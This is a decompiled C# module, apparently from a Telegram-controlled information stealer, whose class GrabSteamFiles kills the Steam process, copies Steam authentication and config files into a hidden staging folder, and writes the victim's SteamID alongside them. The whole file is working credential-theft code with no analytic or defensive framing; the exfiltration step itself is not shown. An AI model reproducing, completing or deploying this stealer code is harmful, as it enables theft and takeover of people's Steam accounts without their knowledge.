using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace TelegramBot
{
	// Token: 0x020000F0 RID: 240
	public class GrabSteamFiles
	{
		// Token: 0x06000331 RID: 817 RVA: 0x00025FE4 File Offset: 0x000241E4
		public static async Task Copy(string Expansion, string ConfigFiles, string Proc, string Name, string SteamID)
		{
			try
			{
				string text = Path.Combine(Folders.hidenfolder + "\\Steam", Name);
				string path = Path.Combine(SteamPath.GetLocationSteam("InstallPath", "SourceModInstallPath"), Name);
				if (Directory.Exists(SteamPath.GetLocationSteam("InstallPath", "SourceModInstallPath")))
				{
					try
					{
						Process[] processesByName = Process.GetProcessesByName(Proc);
						int i = 0;
						while (i < processesByName.Length)
						{
							Process process = processesByName[i];
							try
							{
								process.Kill();
								break;
							}
							catch
							{
								break;
							}
						}
					}
					catch
					{
					}
					if (!Directory.Exists(Folders.hidenfolder + "\\Steam"))
					{
						Directory.CreateDirectory(Folders.hidenfolder + "\\Steam");
						foreach (string text2 in Directory.GetFiles(SteamPath.GetLocationSteam("InstallPath", "SourceModInstallPath"), Expansion))
						{
							try
							{
								File.Copy(text2, Path.Combine(Folders.hidenfolder + "\\Steam", Path.GetFileName(text2)));
							}
							catch
							{
							}
						}
						if (!Directory.Exists(text))
						{
							Directory.CreateDirectory(text);
							File.AppendAllText(Path.Combine(Folders.hidenfolder + "\\Steam", SteamID), SteamProfiles.GetSteamID());
							foreach (string text3 in Directory.GetFiles(path, ConfigFiles))
							{
								try
								{
									File.Copy(text3, Path.Combine(text, Path.GetFileName(text3)));
								}
								catch
								{
								}
							}
						}
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (IOException)
			{
			}
			catch (ArgumentException)
			{
			}
		}

		// Token: 0x04000556 RID: 1366
		public static readonly string DesktopDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

		// Token: 0x04000557 RID: 1367
		public static readonly string Steam = Path.Combine(GrabSteamFiles.DesktopDir, "Steam");
	}
}
